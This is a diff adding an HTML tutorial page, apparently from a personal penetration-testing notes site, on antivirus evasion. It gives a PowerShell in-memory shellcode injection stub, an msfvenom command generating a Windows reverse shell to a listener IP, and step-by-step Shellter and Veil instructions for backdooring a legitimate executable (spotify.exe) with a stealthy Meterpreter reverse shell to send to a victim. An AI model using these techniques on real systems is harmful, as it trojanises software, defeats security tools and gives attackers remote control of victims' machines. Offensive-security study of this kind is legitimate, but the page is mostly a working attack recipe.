@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>Antivirus Evasion</h1>
+            <p>Techniques for bypassing antivirus software</p>
+        </div>
+        <div class="notion-body">
+            <h2>Theory</h2>
+            <ul>
+                <p>Antivirus evasion falls into two broad categories: on-disk and in-memory. There are various methods to so. Packers, Obfuscators, Crypters...</p>
+                <p><b>On-disk:</b> relies on techniques that modify an executable's structure or behavior to make malware harder to detect.</p>
+                <p><b>In-memory:</b> widely used technique to evade antivirus detection by executing malicious code directly in memory instead of writing files to disk, avoiding one of the main areas monitored by AV software. Techniques used includes Remote Process Memory Injection, Reflective DLL, Process Hollowing and Inline Hooking</p>
+            
+                <p>Have in mind that one of the main benefits of executing a script rather than a PE is that it is difficult for antivirus manufacturers to determine if the script is malicious as it's run inside an interpreter and the script itself isn't executable code</p>
+            </ul>
+
+
+
+            <h2>Remote process memory injection</h2>
+            <ul>
+                <p>We will use a well known memory injection powershell script. The script starts by importing VirtualAlloc and CreateThread from kernel32.dll as well as memset from msvcrt.dll. These functions will allow us to allocate memory, create an execution thread, and write arbitrary data to the allocated memory, respectively. We will allocate the memory and execute a new thread in the current process (powershell.exe), rather than a remote one.</p>
+                <pre><code class="language-powershell">$code = '
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+[DllImport("msvcrt.dll")]
+public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+
+place the shellcode here</code></pre>
+
+             <p>In order to generate the payload we will use msfvenom</p>
+             <pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f psh-reflection</code></pre>
+             <p>Now place it with the previous code</p>       
+            
+             <p style="color: red"><b>Remeber that in this case we didn't selected the arch. So the default is code is in x86. Meanining that whenever we executed in the windows machine it needs to be run by Powershell.exe x86 software</b></p>
+            </ul>
+
+            <h2>Automating process memory injection (Using Shellter)</h2>
+            <ul>
+                <p>To automate the process of memory injection we can use <b>Shellter</b> which will modify the provided PE providing us a reverse shell once executed</p>
+                <p>Shellter relies on Wine. Since you may have trouble with Wine, remember to use the following commands otherwise it will show the following error: <b>wine: could not load kernel32.dll, status c0000135</b></p>
+                <pre><code class="language-powershell">echo 'export WINEARCH=win32' >> ~/.zshrc
+echo 'export WINEPREFIX=~/.wine32' >> ~/.zshrc
+source ~/.zshrc
+
+winecfg</code></pre>
+                
+                <p>Some times you may need to run Shellter as root</p>
+                <pre><code class="language-powershell">shellter</code></pre>
+                <p>First select the operation mode. In our case use A which means Automatic</p>   
+                <pre><code class="language-powershell">Choose Operation Mode - Auto/Manual (A/M/H): A</code></pre> 
+                <p>Now select the PE target</p>
+                <pre><code class="language-powershell">PE Target: /home/kali/Downloads/spotify.exe </code></pre>
+                <p>Enable Stealth Mode Which responsible for restoring the execution flow of the backdoored binary and therefore avoids any unwanted suspicion. Basically it will let the binary do it's normal process</p>
+                <pre><code class="language-powershell">Enable Stealth Mode? (Y/N/H): Y</code></pre>      
+                <p>Select the payload needed. Most recommendable is <b>Meterpreter_Reverse_TCP</b></p>
+                <pre><code class="language-powershell">Use a listed payload or custom? (L/C/H): L 
+Select payload by index: 1  </code></pre>
+                <p>Setup IP and port for the reverse shell</p>
+                <pre><code class="language-powershell">SET LHOST: 192.168.45.222                                                                                                                                                                                                                                     
+SET LPORT: 4444</code></pre>
+                <p>Once finished transfer the binary to the target machine, start a listener with metasploit and wait for the victim to clic</p>                                                                                       
+            </ul>
+
+            <h2>Automating process memory injection (Using Veil)</h2>
+            <ul>
+                <p>Once you passed the tremendous setup process, Veil will generate a malicious PE file with the desired payload embedded.</p>
+                <p>Start vail by typing <b>veil</b> It is recommended to run it as root to avoid failures</p>
+                <pre><code class="language-bash">veil</code></pre>
+                <p>Once started select the payload needed. Select option 1 to start evasion</p>
+                <p>Then using <b>LIST</b> you could be able to select the payloads. Then use <b>use payload_number</b> to select one of them. And finally use <b>Generate</b> to create the malicious file.</p>
+                <p>Veil will show you the location of the malicious files. So you can transfer them to the target machine.</p>
+                <p>Finally Setup a metasploit listener to receive the reverse shell connection.</p>
+            </ul>
+              
+        </div>
+    </div>
+</body>
+</html>
